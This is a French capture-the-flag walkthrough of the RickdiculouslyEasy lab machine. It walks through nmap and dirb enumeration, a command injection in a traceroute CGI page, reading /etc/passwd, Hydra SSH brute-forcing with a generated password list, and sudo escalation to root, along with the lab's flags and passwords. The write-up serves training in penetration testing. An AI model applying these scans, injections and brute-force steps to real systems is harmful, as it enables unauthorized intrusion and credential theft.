#Analyse RickdicoulsyEasy


#### Recherche de la machine sur le réseau : 
```bash
└─$ sudo nmap -sS 10.0.2.15/24    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 10:01 EDT
Nmap scan report for 10.0.2.1
Host is up (0.000058s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.2
Host is up (0.00012s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE
631/tcp open  ipp
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.3
Host is up (0.000077s latency).
All 1000 scanned ports on 10.0.2.3 are in ignored states.
Not shown: 1000 filtered tcp ports (proto-unreach)
MAC Address: 08:00:27:3C:A7:51 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.4
Host is up (0.000087s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.15
Host is up (0.0000050s latency).
All 1000 scanned ports on 10.0.2.15 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (5 hosts up) scanned in 2.83 seconds
```

Le bail DHCP atribuée a la machine est : `10.0.2.4`. 

#### Analyse des port ouvert et des version 
```bash
sudo nmap -sS 10.0.2.4 -p- -sV
```

**[OUTPUT]**

```bash
└─$ sudo nmap -sS 10.0.2.4 -p- -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 10:02 EDT
Nmap scan report for 10.0.2.4
Host is up (0.00015s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    Cockpit web service 161 or earlier
13337/tcp open  unknown
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=6/7%Time=629F5A90%P=x86_64-pc-linux-gnu%r(NULL,
SF:42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4\
SF:.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.92%I=7%D=6/7%Time=629F5A90%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.92%I=7%D=6/7%Time=629F5A96%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
SF:erse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.34 seconds

```

### Ports ouvert :

Les ports ouvert suivants on étés identifiés sur la machine.

|  Numero | Service  | Version  | 
|---|---|---|
|  21/tcp | ftp   | vsftpd 3.0.3  | 
|  80/tcp   | http   | Apache httpd 2.4.27 ((Fedora))  | 
| 9090/tcp  | http  |  Cockpit web service 161 or earlier  | 
| 13337/tcp  |  ?  |   |
| 22222/tcp  |  ssh | OpenSSH 7.5 (protocol 2.0)  | 
| 60000/tcp  |  ?  |   | 


Les fignerPrint des services nous donnent beaucoup d'informations :

- le port 6000 semble être un reverse shell
- le port 1337 semble être un Flag

```
└─$ netcat 10.0.2.4 13337   
FLAG:{TheyFoundMyBackDoorMorty}-10Points
```
***
#### 13337 TCP

Le premier FLAG réside dans le protocole utilisé sur le port 13337.

**Identification du FLAG N°1**
`FLAG:{TheyFoundMyBackDoorMorty}-10Points` 


***
#### 80 TCP

On commance rappidement l'analyse par le serveru web sur le port 80.

Une rappide analyse avec DIRB et son dictionaire standard nous donne :

***Mapping de l'arborecance du serveur web***
```bash
└─$ dirb http://10.0.2.4
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun  7 10:22:45 2022
URL_BASE: http://10.0.2.4/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.4/ ----
+ http://10.0.2.4/cgi-bin/ (CODE:403|SIZE:217)                                                                  
+ http://10.0.2.4/index.html (CODE:200|SIZE:326)                                                                
==> DIRECTORY: http://10.0.2.4/passwords/                                                                       
+ http://10.0.2.4/robots.txt (CODE:200|SIZE:126)                                                                
                                                                                                                
---- Entering directory: http://10.0.2.4/passwords/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jun  7 10:22:47 2022
DOWNLOADED: 4612 - FOUND: 3
```

Les quelques fichiers et le dossier semblent interssants.

Je commance par le fichier Robot.txt:

***Annalyse de `robot.txt`***
```bash
└─$ wget http://10.0.2.4/robot.txt 
--2022-06-07 10:38:25--  http://10.0.2.4/robot.txt
Connecting to 10.0.2.4:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2022-06-07 10:38:25 ERROR 404: Not Found.

└─$ file robots.txt               
robots.txt: ASCII text
                                                                                                                   
└─$ cat robots.txt                
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
                                                                                                                   
```
Nous pouvons extraire quelques information sur les fichiers du dossier au quel nous n'avions pas accès.


Les fichier dans cgi-sont prometeurs :

***Annalyse des `.cgi***
```bash 
└─$ ls
robots.txt  root_shell.cgi  tracertool.cgi
                                                                                                                   

└─$ file root_shell.cgi 
root_shell.cgi: HTML document, ASCII text
                                                                                                                   

└─$ cat root_shell.cgi 
<html><head><title>Root Shell
</title></head>
--UNDER CONSTRUCTION--
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.-->
</html>
                                                                                                                   

└─$ file tracertool.cgi 
tracertool.cgi: HTML document, ASCII text
                                                                                                                   

└─$ cat tracertool.cgi 
<html><head><title>Super Cool Webpage
</title></head>
<b>MORTY'S MACHINE TRACER MACHINE</b>
<br>Enter an IP address to trace.</br>
<form action=/cgi-bin/tracertool.cgi
    method="GET">
<textarea name="ip" cols=40 rows=4>
</textarea>
<input type="submit" value="Trace!">
</form>
          
```
Le fichier `tracertool.cgi` semble interessant


Exploration avec un navigateur WEB 

![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-164842.png)

Il est fort probable que cette page soient basée sur l'utilisation de la commande `TraceRoute`


![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-165118.png)

La page est vulnerable aux injections de commandes, nous avons accès a l'utilisateur apache. 
C'est noté dans un coin et je reviendrais dessus.


L'annlyse du dossier password donne ce résultat :

![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-163214.png)

***Récuperation du FLAG***
```bash
└─$ wget http://10.0.2.4/passwords/FLAG.txt
--2022-06-07 10:54:44--  http://10.0.2.4/passwords/FLAG.txt
Connecting to 10.0.2.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 44 [text/plain]
Saving to: ‘FLAG.txt.1’

FLAG.txt.1                   100%[=============================================>]      44  --.-KB/s    in 0s      

2022-06-07 10:54:44 (12.7 MB/s) - ‘FLAG.txt.1’ saved [44/44]

                                                                                                                  
└─$ file FLAG.txt      
FLAG.txt: ASCII text
                                                                                                                   

└─$ cat FLAG.txt      
FLAG{Yeah d- just don't do it.} - 10 Points

```

**Identification du Flag n°2 :**
`FLAG{Yeah d- just don't do it.} - 10 Points`



***Une rappide analyse de `Password.html`***
```bash
--2022-06-07 15:18:27--  http://10.0.2.4/passwords/passwords.html
Connecting to 10.0.2.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 352 [text/html]
Saving to: ‘passwords.html.1’

passwords.html.1             100%[=============================================>]     352  --.-KB/s    in 0s      

2022-06-07 15:18:27 (120 MB/s) - ‘passwords.html.1’ saved [352/352]

                                                                                                                   
└─$ cat passwords.html
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```
Nous trouvons le mot de passe `winter`
***

#### 9090 TCP


La page derriere 9090/tcp donne :

![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-170047.png) 

Cette page donne notre 3eme flag et ne semble pas être plus interessante.

**Identification du 3eme Flag : **
`FLAG {There is no Zeus, in your face!} - 10 Points`

***
#### 6000 TCP

```bash
└─$ netcat 10.0.2.4 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# ls -la
FLAG.txt 
# pwd
/root/blackhole/ 
# cd ..
Permission Denied. 
# whoami
root 
# cd /
Permission Denied. 
# ^C                                                                                                                
```
**Identification du Flag n°4 :**
`FLAG{Flip the pickle Morty!} - 10 Points`

Il semble que l'utilisateur ne puisse pas faire grand chose, je laisse rappidement cette pise de coté.
***


#### tracertool.cgi
L'ensemble des ports on étés explorés, et il ne semble pas y avoir de faille connue et exploitable dans les version des services utilisée. 

Je retourne donc sur ma piste laisée de côté, l'injection de commandes.

Après un peu d'exploration, je constate que la commande `cat` a été remplacée.


Je récupere les utilisateur dans le fichier `/etc/passwd` à l'aide de less.
Après extarction, il semble qu'il existe 3 login utilisable, RickSanchez, Morty, Summer,

***Extarcation et identification des users***
```bash
└─$ cat login | grep -v "nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash

```

Avant de tenter un brutforce complet sur les utilisateurs, nous allons tenter des tester des tous les couples mot de passe / login que nous avons.

J'utilise l'assistant d'Hydra ce qui me coute un essais pour cause de faute de frape

***Utilisation d'hydra sur le l'accès SSH***
```bash
└─$ hydra-wizard

Welcome to the Hydra Wizard

Enter the service to attack (eg: ftp, ssh, http-post-form): ssh
Enter the target to attack (or filename with targets): usable_password.txt
Enter a username to test or a filename: ^C
                                                                                                                   
└─$ hydra-wizard                       

Welcome to the Hydra Wizard

Enter the service to attack (eg: ftp, ssh, http-post-form): ssh
Enter the target to attack (or filename with targets): 10.0.2.4
Enter a username to test or a filename: usable_login.txt
Enter a password to test or a filename: usable_password.txt
If you want to test for passwords (s)ame as login, (n)ull or (r)everse login, enter these letters without spaces (e.g. "sr") or leave empty otherwise: sr
Port number (press enter for default): 22222    

The following options are supported by the service module:
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 16:30:39

Help for module ssh:
============================================================================
The Module ssh does not need or support optional parameters

If you want to add module options, enter them here (or leave empty): 

The following command will be executed now:
 hydra -L usable_login.txt -P usable_password.txt -u -e sr -s 22222  10.0.2.4 ssh

Do you want to run the command now? [Y/n] Y

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 16:30:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://10.0.2.4:22222/
[22222][ssh] host: 10.0.2.4   login: Summer   password: winter
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-07 16:30:47
                                                  
```

Nous avons le login / mdp de l'utilisateur `Summer` mot de passe `winter` 


#### Connextion en SSH au compte de Summer
Nous allons explorer un peu les limites du compte de summer.

```bash
 ssh Summer@10.0.2.4 -p 22222

[Summer@localhost ~]$ ls -la
total 20
drwx------. 2 Summer Summer  99 Jun  8 03:31 .
drwxr-xr-x. 5 root   root    52 Aug 18  2017 ..
-rw-------. 1 Summer Summer   1 Sep 15  2017 .bash_history
-rw-r--r--. 1 Summer Summer  18 May 30  2017 .bash_logout
-rw-r--r--. 1 Summer Summer 193 May 30  2017 .bash_profile
-rw-r--r--. 1 Summer Summer 231 May 30  2017 .bashrc
-rw-rw-r--. 1 Summer Summer  48 Aug 22  2017 FLAG.txt
[Summer@localhost ~]$ file FLAG.txt 
FLAG.txt: ASCII text
[Summer@localhost ~]$ cat FLAG.txt 
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

[Summer@localhost ~]$ less FLAG.txt | taill 10
-bash: taill: command not found
[Summer@localhost ~]$ less FLAG.txt | tail 10
tail: cannot open '10' for reading: No such file or directory
[Summer@localhost ~]$ less FLAG.txt | tail -10
FLAG{Get off the high road Summer!} - 10 Points
[Summer@localhost ~]$ 

```


**Identification du Flag n°5 **
`FLAG{Get off the high road Summer!} - 10 Points`

Il me semble avoir vu un serveur ftp, je vais l'expplorer.

```bash
[Summer@localhost ~]$ cd /var/ftp/
[Summer@localhost ftp]$ ls -la
total 8
drwxr-xr-x.  3 root root   33 Aug 22  2017 .
drwxr-xr-x. 22 root root 4096 Aug 21  2017 ..
-rw-r--r--.  1 root root   42 Aug 22  2017 FLAG.txt
drwxr-xr-x.  2 root root    6 Feb 12  2017 pub
[Summer@localhost ftp]$ 
```
Nous avons trouvé un flag de plus et avoir encore une fois affronter ce terible `cat`, nous avons 

```bash
[Summer@localhost ftp]$ less FLAG.txt | tail -10
FLAG{Whoa this is unexpected} - 10 Points
```

l'exploration du dossier `pub` ne donne rien.

Après de longues recherches il semble que Summer ait accès au /home de tous les utilisateurs

```bash
[Summer@localhost home]$ ls -la
total 0
drwxr-xr-x.  5 root        root         52 Aug 18  2017 .
dr-xr-xr-x. 17 root        root        236 Aug 18  2017 ..
drwxr-xr-x.  2 Morty       Morty       131 Sep 15  2017 Morty
drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21  2017 RickSanchez
drwx------.  2 Summer      Summer       99 Jun  8 03:31 Summer
```

Il semble y avoir un executable "safe" dans le home de Rick 

```
[Summer@localhost RICKS_SAFE]$ ls -la
total 12
drwxr-xr-x. 2 RickSanchez RickSanchez   18 Sep 21  2017 .
drwxr-xr-x. 4 RickSanchez RickSanchez  113 Sep 21  2017 ..
-rwxr--r--. 1 RickSanchez RickSanchez 8704 Sep 21  2017 safe
[Summer@localhost RICKS_SAFE]$ file safe 
safe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6788eee358d9e51e369472b52e684b7d6da7f1ce, not stripped
```

Dans le doute, je le garde sous la main, mais ne le lance pas.

Dans le dossier de morty nous avons deux fichier une archive avec un mot de passe et une image, 


L'immage semble comropue.

Dans le fichier nous avons
```
[Summer@localhost Morty]$ hexdump -C Safe_Password.jpg 
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 60  |......JFIF.....`|
00000010  00 60 00 00 ff e1 00 8c  45 78 69 66 00 00 4d 4d  |.`......Exif..MM|
00000020  00 2a 00 00 00 08 00 05  01 12 00 03 00 00 00 01  |.*..............|
00000030  00 01 00 00 01 1a 00 05  00 00 00 01 00 00 00 4a  |...............J|
00000040  01 1b 00 05 00 00 00 01  00 00 00 52 01 28 00 03  |...........R.(..|
00000050  00 00 00 01 00 02 00 00  87 69 00 04 00 00 00 01  |.........i......|
00000060  00 00 00 5a 00 00 00 00  00 00 00 60 00 00 00 01  |...Z.......`....|
00000070  00 00 00 60 00 00 00 01  00 03 a0 01 00 03 00 00  |...`............|
00000080  00 01 00 01 00 00 a0 02  00 04 00 00 00 01 00 00  |................|
00000090  03 50 a0 03 00 04 00 00  00 01 00 00 04 38 00 00  |.P...........8..|
000000a0  00 00 ff ed 00 38 20 54  68 65 20 53 61 66 65 20  |.....8 The Safe |
000000b0  50 61 73 73 77 6f 72 64  3a 20 46 69 6c 65 3a 20  |Password: File: |
000000c0  2f 68 6f 6d 65 2f 4d 6f  72 74 79 2f 6a 6f 75 72  |/home/Morty/jour|
000000d0  6e 61 6c 2e 74 78 74 2e  7a 69 70 2e 20 50 61 73  |nal.txt.zip. Pas|
000000e0  73 77 6f 72 64 3a 20 4d  65 65 73 65 65 6b 00 38  |sword: Meeseek.8|
000000f0  42 49 4d 04 04 00 00 00  00 00 00 38 42 49 4d 04  |BIM........8BIM.|
00000100  25 00 00 00 00 00 10 d4  1d 8c d9 8f 00 b2 04 e9  |%...............|
00000110  80 09 98 ec f8 42 7e ff  c0 00 11 08 04 38 03 5
```
Password : `Meeseek`

Impossible de dezipper l'archive car Morty en est le propietaire, heureusement après copy, dans le `homedir` nous somme bon.


```
[Summer@localhost Morty]$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
password incorrect--reenter: 
error:  cannot create journal.txt
        Permission denied
```

```
[Summer@localhost Morty]$ cp journal.txt.zip ~/journal.txt.zip
[Summer@localhost Morty]$ cd 
[Summer@localhost ~]$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt             
[Summer@localhost ~]$ ls
FLAG.txt  journal.txt  journal.txt.zip
[Summer@localhost ~]$ less FLAG.txt | tail -10
FLAG{Get off the high road Summer!} - 10 Points
[Summer@localhost ~]$ less journal.txt
[Summer@localhost ~]$ less journal.txt | tail -10
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 
[Summer@localhost ~]$ 

```
Nous avons le password du safe de rick

***Identification du Flag n°6***
 `FLAG: {131333} - 20 Points`


***Ouverture du safe de Rick après copie***
```bash
[Summer@localhost ~]$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.� @
```


***Identification du Flag n°7***
`FLAG{And Awwwaaaaayyyy we Go!} - 20 Points`

Petite enquette en OSINT pour trouver le nom du groupe de Rick.



![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220698-111620.png)


Generation du mot des mots de passe candidat

***Script de géneration des mots de passe***
```python
└─$ cat passwordMaker.py 
import string

band_name = "The Flesh Curtains"

for letter in string.ascii_uppercase:
        for digit in range(0,10):
                for word in band_name.split():
                        print(letter+str(digit)+word)
```


Utilisation  d'hydra pour chercher a passer en SSH, dans le doute on va tester tous les mots de passe sur `root` et sur `RickSanchez`

```bash
└─$ hydra -L /home/kali/Documents/Cours/Rickdiculously/script/users -P /home/kali/Documents/Cours/Rickdiculously/script/passwords -u -s 22222  10.0.2.4 ssh -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 18:48:08
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1560 login tries (l:2/p:780), ~390 tries per task
[DATA] attacking ssh://10.0.2.4:22222/
[STATUS] 58.00 tries/min, 58 tries in 00:01h, 1502 to do in 00:26h, 4 active
[STATUS] 36.00 tries/min, 108 tries in 00:03h, 1452 to do in 00:41h, 4 active
[STATUS] 34.29 tries/min, 240 tries in 00:07h, 1320 to do in 00:39h, 4 active
[STATUS] 32.92 tries/min, 395 tries in 00:12h, 1165 to do in 00:36h, 4 active
[STATUS] 32.47 tries/min, 552 tries in 00:17h, 1008 to do in 00:32h, 4 active
[STATUS] 32.32 tries/min, 711 tries in 00:22h, 849 to do in 00:27h, 4 active
[STATUS] 34.59 tries/min, 934 tries in 00:27h, 626 to do in 00:19h, 4 active
[22222][ssh] host: 10.0.2.4   login: RickSanchez   password: P7Curtains
[STATUS] 38.34 tries/min, 1227 tries in 00:32h, 333 to do in 00:09h, 4 active
[STATUS] 41.27 tries/min, 1527 tries in 00:37h, 33 to do in 00:01h, 4 active
[STATUS] 41.05 tries/min, 1560 tries in 00:38h, 1 to do in 00:01h, 2 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-07 19:26:09
```


Connextion au travers de RickSanchez en ssh

***Passage en Su grace a sudo***

```
[RickSanchez@localhost ~]$ sudo su
[sudo] password for RickSanchez: 
[root@localhost RickSanchez]# ls
RICKS_SAFE  ThisDoesntContainAnyFlags
[root@localhost RickSanchez]# cd
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# less FLAG.txt | tail -10
FLAG: {Ionic Defibrillator} - 30 points
[root@localhost ~]# 

```

***Identification du Flag n°8***
`FLAG: {Ionic Defibrillator} - 30 points`




